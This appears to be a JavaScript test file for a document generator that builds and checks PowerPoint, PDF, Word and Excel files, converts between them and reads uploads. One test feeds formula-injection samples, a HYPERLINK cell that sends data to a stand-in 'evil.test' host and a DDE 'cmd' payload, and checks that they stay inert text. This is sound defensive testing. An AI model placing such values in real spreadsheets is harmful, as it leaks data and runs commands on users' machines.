"use strict";

// Document Studio: every format is generated for real, opened again with
// independent parsing, and checked. No model is involved in these tests.
const assert = require("node:assert/strict");
const { test } = require("node:test");
const JSZip = require("jszip");
const { convertFile, createDocument } = require("./documents");
const { evaluateWorkbook } = require("./documents/formulas");
const { readFile } = require("./documents/read");
const { validateFile, wellFormed } = require("./documents/validate");
const { normalizeWorkbook } = require("./documents/xlsx");

const report = {
  title: "Quarterly review", subtitle: "What changed and what to do next", author: "Asha Rao", audience: "The leadership team", theme: { name: "forest", accent: "#0F766E" },
  sections: [
    { heading: "Summary", notes: "Lead with revenue.", blocks: [{ type: "paragraph", text: "Revenue grew **12%** over the quarter [1]." }, { type: "bullets", items: ["North region led growth", "Churn fell for the second quarter", "Support backlog is the main risk"] }, { type: "callout", text: "One decision is needed: whether to hire two support engineers now." }] },
    { heading: "Revenue by region", blocks: [{ type: "chart", chart: "bar", title: "Revenue (USD thousand)", categories: ["North", "South", "East", "West"], series: [{ name: "Q2", values: [120, 90, 75, 60] }, { name: "Q3", values: [150, 95, 80, 62] }] }] },
    { heading: "Accounts", blocks: [{ type: "table", columns: ["Account", "Plan", "Seats", "ARR"], rows: Array.from({ length: 30 }, (_unused, index) => [`Account ${index + 1}`, index % 2 ? "Team" : "Business", 5 + index, 1200 * (index + 1)]), caption: "Top accounts" }] },
    { heading: "Process", blocks: [{ type: "diagram", steps: ["Lead", "Trial", "Paid", "Renewal"] }, { type: "comparison", left: { title: "Hire now", items: ["Backlog clears in six weeks", "Higher cost this quarter"] }, right: { title: "Wait", items: ["Cost stays flat", "Backlog keeps growing"] } }] },
    { heading: "Next steps", layout: "conclusion", blocks: [{ type: "bullets", ordered: true, items: ["Approve the two hires", "Review churn again in October"] }] },
  ],
  references: [{ title: "Finance close, Q3", url: "https://example.org/finance/q3", publisher: "Finance", date: "2026-10-04" }],
};

const failed = (validation) => validation.checks.filter((check) => !check.ok).map((check) => `${check.name}: ${check.detail}`).join("; ");

test("a PowerPoint deck: editable slides, native charts with their data, speaker notes, nothing over-full", async () => {
  const file = await createDocument({ format: "pptx", spec: report });
  assert.equal(file.validation.ok, true, failed(file.validation));
  assert.equal(file.name, "Quarterly review.pptx");
  const zip = await JSZip.loadAsync(file.buffer);
  const slides = Object.keys(zip.files).filter((name) => /^ppt\/slides\/slide\d+\.xml$/.test(name));
  assert.equal(slides.length, file.summary.slides);
  assert.ok(slides.length >= 9, `${slides.length} slides`);
  // The chart is a chart part with an embedded workbook, not a picture.
  assert.equal(Object.keys(zip.files).filter((name) => /^ppt\/charts\/chart\d+\.xml$/.test(name)).length, 1);
  assert.ok(Object.keys(zip.files).some((name) => /^ppt\/embeddings\/.+\.xlsx$/.test(name)));
  assert.match(await zip.file("ppt/charts/chart1.xml").async("string"), /<c:barChart>[\s\S]*North[\s\S]*150/);
  // Text is text: the title and a bullet are in the slide XML as runs.
  const read = await readFile(file.buffer, "deck.pptx");
  assert.match(read.text, /Quarterly review/);
  assert.match(read.text, /North region led growth/);
  assert.match(read.text, /Speaker notes: Lead with revenue\./);
  // The 30-row table continues over several slides, each with its header.
  assert.ok(read.tables.length >= 2);
  assert.deepEqual(read.tables[0].columns, ["Account", "Plan", "Seats", "ARR"]);
  assert.equal(read.tables.reduce((sum, table) => sum + table.rows.length, 0), 30);
  assert.ok(file.report.slides.every((slide) => slide.fill <= 1));
});

test("a PDF report: real pages, readable text, contents, references", async () => {
  const file = await createDocument({ format: "pdf", spec: report });
  assert.equal(file.validation.ok, true, failed(file.validation));
  assert.equal(file.buffer.subarray(0, 5).toString(), "%PDF-");
  const read = await readFile(file.buffer, "report.pdf");
  assert.equal(read.meta.pages, file.summary.pages);
  assert.ok(read.meta.pages >= 4);
  assert.equal(read.meta.title, "Quarterly review");
  for (const phrase of ["Contents", "Revenue by region", "Account 30", "Page 1 of", "References", "https://example.org/finance/q3", "Prepared by Asha Rao"]) assert.ok(read.text.includes(phrase), phrase);
  // Markdown emphasis from the model is cleaned, not printed.
  assert.ok(read.text.includes("Revenue grew 12% over the quarter [1]."));
});

test("a Word document: heading styles, real tables, a contents field, page numbers and a live link", async () => {
  const file = await createDocument({ format: "docx", spec: report });
  assert.equal(file.validation.ok, true, failed(file.validation));
  const zip = await JSZip.loadAsync(file.buffer);
  const xml = await zip.file("word/document.xml").async("string");
  assert.equal((xml.match(/<w:pStyle w:val="Heading1"\/>/g) || []).length, 6);
  assert.match(xml, /TOC \\h/);
  assert.ok(Object.keys(zip.files).some((name) => /^word\/footer\d+\.xml$/.test(name)));
  assert.match(await zip.file("word/_rels/document.xml.rels").async("string"), /https:\/\/example\.org\/finance\/q3/);
  const read = await readFile(file.buffer, "report.docx");
  const accounts = read.tables.find((table) => table.columns.includes("ARR"));
  assert.equal(accounts.rows.length, 30);
  assert.deepEqual(accounts.rows[0], ["Account 1", "Business", 5, "1,200"]);
  assert.match(read.text, /# Summary/);
});

const workbook = {
  title: "Monthly expenses",
  sheets: [
    {
      name: "Expenses", columns: [{ header: "Month" }, { header: "Rent", format: "currency" }, { header: "Food", format: "currency" }, { header: "Total", format: "currency" }, { header: "Status" }],
      rows: ["Jan", "Feb", "Mar", "Apr"].map((month, index) => [month, 1200, 300 + index * 25, `=SUM(B${index + 2}:C${index + 2})`, index % 2 ? "Paid" : "Due"]),
      totals: { label: "Total", functions: { Rent: "SUM", Food: "SUM", Total: "SUM" } },
      conditional: [{ range: "D2:D5", rule: "greaterThan", value: 1540, color: "red" }],
      validation: [{ range: "E2:E5", type: "list", values: ["Paid", "Due"] }],
      charts: [{ type: "line", title: "Total by month", categories: "A2:A5", series: [{ name: "Total", values: "D2:D5" }] }],
    },
    { name: "Summary", table: false, columns: [{ header: "Measure" }, { header: "Value", format: "currency" }], rows: [["Average month", "=AVERAGE(Expenses!D2:D5)"], ["Highest month", "=MAX(Expenses!D2:D5)"], ["Loan payment", "=PMT(0.06/12,24,-5000)"]] },
  ],
};

test("an Excel workbook: formulas stay formulas with their computed values, plus a table, a chart, rules and frozen headers", async () => {
  const file = await createDocument({ format: "xlsx", spec: workbook });
  assert.equal(file.validation.ok, true, failed(file.validation));
  const zip = await JSZip.loadAsync(file.buffer);
  const sheet = await zip.file("xl/worksheets/sheet1.xml").async("string");
  // The formula and what it computes to are both there; the value never replaces the formula.
  assert.match(sheet, /<c r="D2" s="3"><f>SUM\(B2:C2\)<\/f><v>1500<\/v><\/c>/);
  assert.match(sheet, /<f>SUM\(D2:D5\)<\/f><v>6150<\/v>/);
  assert.match(sheet, /<pane ySplit="1" topLeftCell="A2" activePane="bottomLeft" state="frozen"\/>/);
  assert.match(sheet, /<conditionalFormatting sqref="D2:D5"><cfRule type="cellIs" dxfId="1" priority="1" operator="greaterThan"><formula>1540<\/formula>/);
  assert.match(sheet, /<dataValidation type="list"[^>]*sqref="E2:E5"><formula1>"Paid,Due"<\/formula1>/);
  assert.match(await zip.file("xl/tables/table1.xml").async("string"), /ref="A1:E5"[\s\S]*<autoFilter ref="A1:E5"\/>/);
  assert.match(await zip.file("xl/charts/chart1.xml").async("string"), /<c:lineChart>[\s\S]*&apos;Expenses&apos;!\$D\$2:\$D\$5[\s\S]*<c:v>1500<\/c:v>/);
  assert.match(await zip.file("xl/workbook.xml").async("string"), /fullCalcOnLoad="1"/);
  const read = await readFile(file.buffer, "book.xlsx");
  assert.equal(read.meta.formulas, 10);
  assert.deepEqual(read.tables[1].rows.map((row) => Math.round(row[1] * 100) / 100), [1537.5, 1575, 221.6]);
});

test("a workbook with a broken formula is refused, with the cell and the reason", async () => {
  const broken = { title: "Broken", sheets: [{ name: "Data", columns: [{ header: "A" }, { header: "B" }], rows: [[1, "=SUM(Missing!A1:A9)"], [2, "=A2/0"], [3, "=SUM(A2:A4"]] }] };
  await assert.rejects(() => createDocument({ format: "xlsx", spec: broken }), (error) => {
    assert.equal(error.reason, "validation-failed");
    assert.match(error.message, /No formula ends in an error/);
    assert.match(error.message, /Data!B2 =SUM\(Missing!A1:A9\)/);
    assert.equal(error.report.formulaErrors.length, 3);
    return true;
  });
  // A function the checker doesn't know is kept and listed as not checked, never treated as broken.
  const exotic = await createDocument({ format: "xlsx", spec: { title: "Lookup", sheets: [{ name: "Data", columns: [{ header: "Key" }, { header: "Value" }], rows: [["a", 1], ["b", "=XLOOKUP(\"a\",A2:A2,B2:B2)"]] }] } });
  assert.equal(exotic.report.formulasNotChecked.length, 1);
  assert.match(await (await JSZip.loadAsync(exotic.buffer)).file("xl/worksheets/sheet1.xml").async("string"), /<f>XLOOKUP\(&quot;a&quot;,A2:A2,B2:B2\)<\/f><\/c>/);
});

test("formulas compute across sheets, and a formula that refers to itself is caught", () => {
  const result = evaluateWorkbook([{ name: "A", grid: [[10, 20, "=A1+B1"], ["=C1*2", "=A2+1", "=C2"]] }, { name: "B", grid: [["=SUM(A!A1:C1)", "=B1"]] }]);
  assert.deepEqual(result.values[0][0][2], 30);
  assert.deepEqual(result.values[0][1].slice(0, 2), [60, 61]);
  assert.equal(result.values[1][0][0], 60);
  assert.equal(result.errors.length, 2);
  assert.match(result.errors.map((item) => item.error).join(" "), /refers back to itself/);
});

test("a total over a column of formulas on a later sheet computes (formulas are worked out in any order)", () => {
  const result = evaluateWorkbook([{ name: "Summary", grid: [["=SUM(Data!C1:C3)/SUM(Data!A1:A3)"]] }, { name: "Data", grid: [[10, 4, "=A1-B1"], [20, 5, "=A2-B2"], [30, 6, "=A3-B3"]] }]);
  assert.deepEqual(result.errors, []);
  assert.equal(result.values[0][0][0], 45 / 60);
});

test("sheet names are made valid and unique, and formulas follow the rename", () => {
  const model = normalizeWorkbook({ sheets: [{ name: "Q1/Q2: plan?", columns: ["x"], rows: [[1]] }, { name: "Q1/Q2: plan?", columns: ["x"], rows: [["='Q1/Q2: plan?'!A2"]] }] });
  assert.deepEqual(model.sheets.map((sheet) => sheet.name), ["Q1 Q2 plan", "Q1 Q2 plan 2"]);
  assert.throws(() => normalizeWorkbook({ sheets: [] }), /at least one sheet/);
});

test("files convert between formats without losing their words or tables, and the source is described honestly", async () => {
  const docx = await createDocument({ format: "docx", spec: report });
  const pdf = await convertFile({ buffer: docx.buffer, name: "Quarterly review.docx", to: "pdf" });
  assert.equal(pdf.validation.ok, true);
  assert.deepEqual(pdf.source.coverage.truncated, false);
  const back = await readFile(pdf.buffer, "x.pdf");
  for (const phrase of ["North region led growth", "Account 30", "Next steps"]) assert.ok(back.text.includes(phrase), phrase);

  const deck = await createDocument({ format: "pptx", spec: report });
  const fromDeck = await convertFile({ buffer: deck.buffer, name: "deck.pptx", to: "docx" });
  assert.match((await readFile(fromDeck.buffer, "x.docx")).text, /# Revenue by region/);

  const book = await createDocument({ format: "xlsx", spec: workbook });
  const slides = await convertFile({ buffer: book.buffer, name: "Monthly expenses.xlsx", to: "pptx" });
  const slideText = await readFile(slides.buffer, "x.pptx");
  assert.deepEqual(slideText.tables[0].columns, ["Month", "Rent", "Food", "Total", "Status"]);
  // The computed totals travel, not the formula text.
  assert.ok(slideText.tables[0].rows.some((row) => row.includes("1,500")));

  const sheet = await convertFile({ buffer: docx.buffer, name: "Quarterly review.docx", to: "xlsx" });
  assert.ok((await readFile(sheet.buffer, "x.xlsx")).tables.some((table) => table.columns.includes("ARR") && table.rows.length === 30));
  await assert.rejects(() => convertFile({ buffer: Buffer.from("just some words\nand more words"), name: "notes.txt", to: "xlsx" }), /no tables/);
});

test("text from someone's file that begins with = is written as text, never as a live formula", async () => {
  const hostile = Buffer.from("Name,Note\nAsha,=HYPERLINK(\"https://evil.test/?\"&A1)\nBo,=1+1\nCy,+SUM(A1:A2)\n");
  const sheet = await convertFile({ buffer: hostile, name: "contacts.csv", to: "xlsx" });
  const xml = await (await JSZip.loadAsync(sheet.buffer)).file("xl/worksheets/sheet1.xml").async("string");
  assert.ok(!xml.includes("<f>"), "no cell from the file became a formula");
  assert.match(xml, /<c r="B2" s="0" t="inlineStr"><is><t xml:space="preserve">=HYPERLINK\(&quot;https:\/\/evil\.test\/\?&quot;&amp;A1\)<\/t><\/is><\/c>/);
  assert.match(xml, /<t xml:space="preserve">=1\+1<\/t>/);
  assert.equal(sheet.report.formulas, 0);
  // The same holds for a table in a document that is put into a workbook.
  const fromDocument = await createDocument({ format: "xlsx", spec: { title: "T", sections: [{ heading: "Data", blocks: [{ type: "table", columns: ["A", "B"], rows: [["x", "=cmd|' /C calc'!A0"]] }] }] } });
  assert.equal(fromDocument.report.formulas, 0);
  // A formula the caller wrote in their own workbook description is still a formula.
  const own = await createDocument({ format: "xlsx", spec: { title: "T", sheets: [{ name: "S", columns: ["A", "B"], rows: [[2, "=A2*2"]] }] } });
  assert.equal(own.report.formulas, 1);
});

test("uploads are read with an honest account of what was and wasn't read", async () => {
  const csv = await readFile(Buffer.from("name,amount,note\n\"Rao, A\",120.5,\"said \"\"hi\"\"\"\nLee,80,\n"), "people.csv");
  assert.deepEqual(csv.tables[0], { name: "people", columns: ["name", "amount", "note"], rows: [["Rao, A", 120.5, "said \"hi\""], ["Lee", 80, ""]] });
  const json = await readFile(Buffer.from(JSON.stringify([{ city: "Pune", population: 7400000 }, { city: "Nashik", population: 2100000 }])), "cities.json");
  assert.deepEqual(json.tables[0].rows, [["Pune", 7400000], ["Nashik", 2100000]]);
  const long = await readFile(Buffer.from("word ".repeat(40_000)), "long.txt", { maxText: 1000 });
  assert.equal(long.text.length, 1000);
  assert.equal(long.coverage.truncated, true);
  assert.match(long.coverage.notes[0], /Only the first 1,000 of 200,000 characters/);
  await assert.rejects(() => readFile(Buffer.from([0x50, 0x4b, 3, 4, 0, 0, 0, 0]), "broken.docx"), /damaged/);
  await assert.rejects(() => readFile(Buffer.from([0, 1, 2, 3, 255, 254, 0, 0, 7, 8, 1, 2, 3, 0, 0, 5]), "blob.txt"), /isn't text/);
  await assert.rejects(() => readFile(Buffer.from("x"), "old.doc"), /old Office format/);
  await assert.rejects(() => readFile(Buffer.alloc(0), "empty.txt"), /empty/);
});

test("an image is recognised as an image and refused as a document, routed to the vision model instead of being misread", async () => {
  const { kindOf } = require("./documents/read");
  const png = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0x00, 0x00, 0x00]);
  assert.equal(kindOf("wiring.png", png), "image");
  await assert.rejects(() => readFile(png, "wiring.png"), /vision model/);
  const jpeg = Buffer.from([0xff, 0xd8, 0xff, 0xe0, 0x00, 0x10, 0x4a, 0x46, 0x49, 0x46]);
  assert.equal(kindOf("label.jpg", jpeg), "image");
  await assert.rejects(() => readFile(jpeg, "label.jpg"), /vision model/);
});

test("validation refuses a damaged file and a file whose content was changed after writing", async () => {
  assert.equal(wellFormed("<a><b x=\"1>2\"/></a>"), true);
  assert.equal(wellFormed("<a><b></a>"), false);
  const file = await createDocument({ format: "xlsx", spec: workbook });
  const cut = await validateFile("xlsx", file.buffer.subarray(0, file.buffer.length - 400), { report: file.report, model: file.model });
  assert.equal(cut.ok, false);
  // Someone replacing a formula with its value is exactly what must be noticed.
  const zip = await JSZip.loadAsync(file.buffer);
  zip.file("xl/worksheets/sheet1.xml", (await zip.file("xl/worksheets/sheet1.xml").async("string")).replace("<f>SUM(B2:C2)</f>", ""));
  const flattened = await validateFile("xlsx", await zip.generateAsync({ type: "nodebuffer" }), { report: file.report, model: file.model });
  assert.equal(flattened.checks.find((check) => check.name === "Formulas are still formulas").ok, false);
});

test("a document needs a title and content; images must be the person's own PNG or JPEG data", async () => {
  await assert.rejects(() => createDocument({ format: "pdf", spec: { title: "", sections: [] } }), /needs a title/);
  await assert.rejects(() => createDocument({ format: "pdf", spec: { title: "T", sections: [] } }), /at least one section/);
  await assert.rejects(() => createDocument({ format: "odt", spec: report }), /pptx, pdf, docx or xlsx/);
  // A remote image address is dropped: nothing is fetched while making a document.
  const file = await createDocument({ format: "docx", spec: { title: "T", sections: [{ heading: "H", blocks: [{ type: "image", data: "https://example.com/tracker.png" }, { type: "paragraph", text: "Body" }] }] } });
  assert.deepEqual(file.summary.sections[0].blocks, ["paragraph"]);
});
